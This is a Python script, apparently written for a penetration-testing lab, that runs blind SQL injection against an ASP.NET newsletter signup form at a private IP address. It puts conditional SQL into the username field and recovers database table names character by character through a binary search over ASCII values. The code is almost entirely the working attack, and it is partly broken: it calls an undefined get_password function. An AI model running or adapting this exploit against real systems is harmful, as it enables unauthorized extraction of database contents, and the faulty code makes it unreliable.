import requests
import warnings

sql_inj_payload = "asd',NULL);"

warnings.filterwarnings("ignore")

url = 'http://10.11.1.229/Newsletter/'
headers = {
    "Origin": "http://10.11.1.229",
    "Host": "10.11.1.229",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0",
    "Content-Length": "900",
    "Referer": "http://10.11.1.229/Newsletter/",
    "Upgrade-Insecure-Requests": "1",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "close",
}



def check(payload):
    proxies = {
        'http': 'http://127.0.0.1:8080'
    }

    data = {"__EVENTTARGET": "",
            "__EVENTARGUMENT": "",
            "__VIEWSTATE": "y0dgsAikOX8yKT8oTU2lnOp248iRBrX6Pbq8yXZ6MOKP5W7PF+nrPx/D9UatCw0RLN/3Wvz5INkB4hCa+tVY1jUp+autT+CP09DpiJ+08cO/6A6OTZEc+0r0kZ3GQ+Y06QUUrhGCcj2Y4NLFSNuThVKOeO3J7Wb/d1ludfDHyks=",
            "__VIEWSTATEGENERATOR": "A9B807B2",
            "__EVENTVALIDATION": "erCkzzzgvYWMfMJOrnT/5xwlCpZnxd+UoWb+p6lem5HA6H1q28SzTmtNnarNaJNvBQamM1KpeWB6u4WJ+uZFXCz7L3DTS6pYuS98ZTJ8ddvByD4R1TUIZDR/ZUzWEw/b/RVoNoBEgzSs3IkIrbre9sDfIqknSPINWBeE+t3rDPg=",
            "ctl00$MainContent$UsernameBox": f"{sql_inj_payload}{payload}----",
            "ctl00$MainContent$emailBox": "asd",
            "ctl00$MainContent$submit": "Submit"
            } 
    print(f"{sql_inj_payload}{payload}")
    req = requests.post(url=url, headers=headers, data=data, proxies=proxies, verify=False, allow_redirects=False)
    #req = requests.post(url=url, headers=headers, data=data, verify=False, allow_redirects=False)
    if (req.status_code == 200):
        return True
    else:
        return False


def rev_compare_ch(word):
    if (word == '<'):
        return '>'
    if (word == '>'):
        return '<'

    raise NotImplemented


def get_data():
    password = ""
    letter_number = 1
    while(1):
        new_letter = word_brute(letter_number,password)
        if (new_letter == None):
            print(password)
            break;
        password += str(new_letter)
        letter_number += 1



def word_brute(letter_number,password):
    max_number = 128
    prev_snumber = 128
    snumber = 64
    compare_ch = '<'
    #IF ((ASCII(SUBSTRING((SELECT name FROM users ORDER BY 1 OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY), {letter_number}, 1)) {compare_ch} {snumber})) select 'true' else RECONFIGURE;"
    payload = f"IF ((ASCII(SUBSTRING((SELECT NAME FROM SYSOBJECTS WHERE xtype = 'U' ORDER BY 1 OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY), {letter_number}, 1)) {compare_ch} {snumber})) select 'true' else RECONFIGURE;"
    iter = 1
    stop = False
    while (1):
        if (check(payload)):
            stop = False

            print(f'{password}{chr(snumber)}', end='\r')

            temp = snumber
            if (compare_ch == '<'):
                snumber = snumber - int(abs((prev_snumber - snumber) / 2))
            else:
                snumber = snumber + int(abs((prev_snumber - snumber) / 2))

            prev_snumber = temp

        else:
            if (stop):
                if (int(snumber) != 64):
                    print(f'{password}{chr(snumber)}', end='\r')
                    return chr(snumber)
                else:
                    return None

        payload = f"IF ((ASCII(SUBSTRING((SELECT NAME FROM SYSOBJECTS WHERE xtype = 'U' ORDER BY 1 OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY), {letter_number}, 1)) {compare_ch} {snumber})) select 'true' else RECONFIGURE;"
        iter = iter + 1
        if (iter > 14):
            return None
            break


get_password()
